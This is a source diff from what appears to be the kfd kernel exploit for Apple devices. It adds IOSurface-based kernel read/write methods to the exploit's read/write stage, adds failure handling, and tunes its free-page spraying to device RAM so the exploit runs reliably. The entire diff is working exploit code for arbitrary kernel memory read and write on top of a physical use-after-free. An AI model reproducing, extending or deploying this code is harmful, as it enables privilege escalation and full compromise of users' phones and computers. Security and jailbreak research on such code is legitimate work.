@@ -17,6 +17,7 @@
 
 #include "krkw/kread/kread_kqueue_workloop_ctl.h"
 #include "krkw/kread/kread_sem_open.h"
+#include "krkw/kread/kread_IOSurface.h"
 
 #define kwrite_from_method(type, method)                                       \
     do {                                                                       \
@@ -30,11 +31,12 @@
 
 #include "krkw/kwrite/kwrite_dup.h"
 #include "krkw/kwrite/kwrite_sem_open.h"
+#include "krkw/kwrite/kwrite_IOSurface.h"
 
 // Forward declarations for helper functions.
 void krkw_helper_init(struct kfd* kfd, struct krkw* krkw);
-void krkw_helper_grab_free_pages(struct kfd* kfd);
-void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw);
+bool krkw_helper_grab_free_pages(struct kfd* kfd);
+bool krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw);
 void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw);
 void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);
 
@@ -70,8 +72,13 @@ void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);
 
 void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
 {
-    if (!kern_versions[kfd->info.env.vid].kread_kqueue_workloop_ctl_supported) {
+    if (!dynamic_system_info.kread_kqueue_workloop_ctl_supported) {
         assert(kread_method != kread_kqueue_workloop_ctl);
+    }
+    
+    if (!dynamic_system_info.krkw_iosurface_supported) {
+        assert(kread_method != kread_IOSurface);
+        assert(kwrite_method != kwrite_IOSurface);
     }
 
     if (kread_method == kread_sem_open) {
@@ -81,36 +88,53 @@ void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
     switch (kread_method) {
         kread_method_case(kread_kqueue_workloop_ctl)
         kread_method_case(kread_sem_open)
+        kread_method_case(kread_IOSurface)
     }
 
     switch (kwrite_method) {
         kwrite_method_case(kwrite_dup)
         kwrite_method_case(kwrite_sem_open)
+        kwrite_method_case(kwrite_IOSurface)
     }
 
     krkw_helper_init(kfd, &kfd->kread);
     krkw_helper_init(kfd, &kfd->kwrite);
 }
 
-void krkw_run(struct kfd* kfd)
+bool krkw_run(struct kfd* kfd)
 {
-    krkw_helper_grab_free_pages(kfd);
+    if(krkw_helper_grab_free_pages(kfd) == false) return false;
 
-    timer_start();
-    krkw_helper_run_allocate(kfd, &kfd->kread);
-    krkw_helper_run_allocate(kfd, &kfd->kwrite);
+    //timer_start();
+    if(krkw_helper_run_allocate(kfd, &kfd->kread) == false) {
+        krkw_helper_run_deallocate(kfd, &kfd->kread);
+        if (kfd->kread.krkw_method_ops.deallocate == kread_sem_open_deallocate) {
+            krkw_helper_run_deallocate(kfd, &kfd->kwrite);
+        }
+        return false;
+    }
+    if(krkw_helper_run_allocate(kfd, &kfd->kwrite) == false) {
+        krkw_helper_run_deallocate(kfd, &kfd->kread);
+        krkw_helper_run_deallocate(kfd, &kfd->kwrite);
+        return false;
+    }
+    
+    usleep(1000);
     krkw_helper_run_deallocate(kfd, &kfd->kread);
     krkw_helper_run_deallocate(kfd, &kfd->kwrite);
-    timer_end();
+    //timer_end();
+    return true;
 }
 
 void krkw_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
 {
+    assert(kaddr >= 0xfffff00000000000);
     kfd->kread.krkw_method_ops.kread(kfd, kaddr, uaddr, size);
 }
 
 void krkw_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
 {
+    assert(kaddr >= 0xfffff00000000000);
     kfd->kwrite.krkw_method_ops.kwrite(kfd, uaddr, kaddr, size);
 }
 
@@ -129,13 +153,26 @@ void krkw_helper_init(struct kfd* kfd, struct krkw* krkw)
     krkw->krkw_method_ops.init(kfd);
 }
 
-void krkw_helper_grab_free_pages(struct kfd* kfd)
+bool krkw_helper_grab_free_pages(struct kfd* kfd)
 {
-    timer_start();
+    //timer_start();
+
+    uint64_t device_ram = 0;
+    size_t device_ram_size = sizeof(device_ram);
+    int res = sysctlbyname("hw.memsize", &device_ram, &device_ram_size, NULL, 0);
 
     const u64 copy_pages = (kfd->info.copy.size / pages(1));
     const u64 grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
-    const u64 grabbed_free_pages_max = 400000;
+    // For 8GB+, 200000 is the minimum needed for a reliable exploit. For 16GB, 400000 is the minimum.
+    // hw.memsize reports the amount of RAM after carveouts, so we pick a value lower than the
+    // actual amount of RAM to compare against.
+    u64 grabbed_free_pages_max = 80000;
+    if (device_ram >= 1024 * 1024 * 1024 * 12ULL) { // 16GB devices
+        grabbed_free_pages_max = 800000;
+    } else if (device_ram >= 1024 * 1024 * 1024 * 5ULL) { // 6GB/8GB devices
+        grabbed_free_pages_max = 200000;
+    }
+    print("RAM size: 0x%llx, free pages max: 0x%llx\n", device_ram, grabbed_free_pages_max);
 
     for (u64 grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
         assert_mach(vm_copy(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size, kfd->info.copy.dst_uaddr));
@@ -146,19 +183,20 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
             if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                     print_u64(grabbed_free_pages);
-                    timer_end();
-                    return;
+                    //timer_end();
+                    return true;
                 }
             }
         }
     }
 
-    print_warning("failed to grab free pages goal");
+    print_warning("failed to grab free pages goal (goal %llu, max %llu, RAM size 0x%llx)", grabbed_puaf_pages_goal, grabbed_free_pages_max, device_ram);
+    return false;
 }
 
-void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
+bool krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
 {
-    timer_start();
+    //timer_start();
     const u64 batch_size = (pages(1) / krkw->krkw_object_size);
 
     while (true) {
@@ -205,7 +243,7 @@ loop_break:
         }
     }
 
-    timer_end();
+    //timer_end();
     const char* krkw_type = (krkw->krkw_method_ops.kread) ? "kread" : "kwrite";
 
     if (!krkw->krkw_object_uaddr) {
@@ -214,7 +252,8 @@ loop_break:
             print_buffer(puaf_page_uaddr, 64);
         }
 
-        assert_false(krkw_type);
+        //assert_false(krkw_type);
+        return false;
     }
 
     print_message(
@@ -233,6 +272,7 @@ loop_break:
     if (!kfd->info.kaddr.current_proc) {
         krkw->krkw_method_ops.find_proc(kfd);
     }
+    return true;
 }
 
 void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
